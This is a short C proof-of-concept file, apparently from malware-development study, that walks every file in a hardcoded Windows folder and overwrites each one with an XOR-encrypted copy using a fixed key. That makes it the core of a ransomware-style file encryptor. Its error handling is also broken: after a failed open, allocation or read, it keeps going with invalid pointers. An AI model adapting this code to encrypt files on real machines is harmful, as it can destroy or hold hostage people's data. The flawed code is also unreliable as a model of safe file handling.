#include <Windows.h>
#include <stdio.h>
#include <string.h>

// Simple PoC to demonstrate XOR encryption
// Run once to encrypt, run again to decrypt
// File paths are hardcoded on lines 23 and 39

// Compile with: cl xorenc.c

void xorEncrypt(char* file_contents, size_t length) {
	char key[] = "maldev"; // key that will be XORed against our input (contents of file)
	size_t key_len = strlen(key);

	for (size_t i = 0; i < length; i++) {
		file_contents[i] ^= key[i % key_len];
	}
}

int main() {
	WIN32_FIND_DATAA data;
	HANDLE hFind = FindFirstFileA("c:\\code\\test\\*", &data);

	if (hFind == INVALID_HANDLE_VALUE) {
		printf("Error: %lu\n", GetLastError());
		return 1;
	}

	do {
		// Skip '.' or '..' (which are the first two results returned)
		if (strcmp(data.cFileName, ".") == 0 || strcmp(data.cFileName, "..") == 0) {
			continue;
		}

		printf("[+] Processing file: %s\n", data.cFileName);
		
		// You don't need to provide a full path to fopen_s but for testing this was helpful
		char fullPath[MAX_PATH];
		snprintf(fullPath, MAX_PATH, "c:\\code\\test\\%s", data.cFileName);

		// Open the file 
		FILE* file = NULL; // pointer to file
		if (fopen_s(&file, fullPath, "rb") != 0 || file == NULL) {
			printf("[-] Failed to open file: %u\n", GetLastError());
		}

		// Get file size
		fseek(file, 0, SEEK_END); // Move to the end of the file
		long fileSize = ftell(file); // Get the current position (which is now the size)
		fseek(file, 0, SEEK_SET); // Rewind back to the beginning of file

		// Allocate memory for file contents 
		char* contents = (char*)malloc(fileSize);
		if (!contents) {
			printf("[-] malloc failed: %u\n", GetLastError());
			fclose(file);
		}

		// Read file contents
		size_t read = fread(contents, 1, fileSize, file);
		fclose(file);  // close after reading

		if (read != (size_t)fileSize) {
			printf("[-] Failed to read entire file\n");
			free(contents);
		}

		// Encrypt
		xorEncrypt(contents, fileSize);

		// Write back the encrypted version
		if (fopen_s(&file, fullPath, "wb") == 0 && file) {
			fwrite(contents, 1, fileSize, file);
			fclose(file);
		}

		free(contents);

	} while (FindNextFileA(hFind, &data));

	FindClose(hFind);
	return 0;
}
